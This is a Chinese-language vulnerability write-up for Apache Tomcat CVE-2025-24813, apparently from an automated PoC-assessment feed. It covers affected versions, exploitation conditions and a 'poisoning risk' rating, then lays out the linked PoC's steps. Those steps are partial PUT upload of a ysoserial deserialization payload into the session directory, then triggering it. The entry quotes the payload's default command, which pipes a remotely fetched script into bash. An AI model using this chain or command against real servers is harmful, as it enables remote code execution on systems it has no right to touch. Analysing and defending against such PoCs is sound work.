## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)